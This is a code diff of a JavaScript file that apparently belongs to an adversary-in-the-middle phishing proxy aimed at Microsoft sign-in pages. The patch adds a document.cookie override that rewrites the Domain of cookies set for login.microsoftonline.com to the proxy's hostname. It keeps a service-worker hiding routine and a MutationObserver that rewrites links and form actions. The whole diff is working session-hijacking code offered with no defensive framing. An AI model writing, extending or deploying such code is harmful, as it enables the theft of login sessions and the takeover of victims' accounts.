@@ -1,7 +1,7 @@
 // ============================================================
-// MINIMAL SCRIPT – No cookie hijacking, only SW hiding + MutationObserver
+// PATCHED SCRIPT – SW hiding + MutationObserver + Cookie Domain Rewriter
 // ============================================================
-console.log('[DOM SCRIPT] Minimal version loaded');
+console.log('[DOM SCRIPT] Patched version loaded');
 
 // ---- 1. Hide Service Worker ----
 (function () {
@@ -34,7 +34,7 @@ console.log('[DOM SCRIPT] Minimal version loaded');
     };
 })();
 
-// ---- 2. MutationObserver for href/action rewriting (kept) ----
+// ---- 2. MutationObserver for href/action rewriting ----
 const observer = new MutationObserver((mutations) => {
     for (const mutation of mutations) {
         if (mutation.type === "attributes") {
@@ -69,4 +69,34 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
     } catch { }
 }
 
-// ---- NOTE: Cookie hijacking removed to allow Microsoft cookies ----
+// ---- 3. Cookie Domain Rewriter (fix for JavaScript-set cookies) ----
+(function() {
+    const originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+    const originalSet = originalDescriptor.set;
+    const originalGet = originalDescriptor.get;
+    const proxyDomain = window.__originalHostname;  // saved by the domain mask
+
+    if (!proxyDomain) {
+        console.warn('[Cookie Patch] __originalHostname not found; using location.hostname');
+    }
+    const effectiveDomain = proxyDomain || window.location.hostname;
+
+    Object.defineProperty(document, 'cookie', {
+        get: originalGet,
+        set: function(value) {
+            let newValue = value;
+            // If the cookie is being set for login.microsoftonline.com, rewrite Domain
+            if (value && value.includes('login.microsoftonline.com')) {
+                // Replace Domain=.login.microsoftonline.com or Domain=login.microsoftonline.com
+                newValue = value.replace(/\bDomain\s*=\s*[^;]+/i, `Domain=${effectiveDomain}`);
+                // If no Domain attribute is present, add it (unlikely but safe)
+                if (!/Domain\s*=/i.test(newValue)) {
+                    newValue += `; Domain=${effectiveDomain}`;
+                }
+            }
+            originalSet.call(document, newValue);
+        },
+        configurable: true
+    });
+    console.log('[Cookie Patch] Active – cookies for microsoftonline.com will be rewritten to domain:', effectiveDomain);
+})();
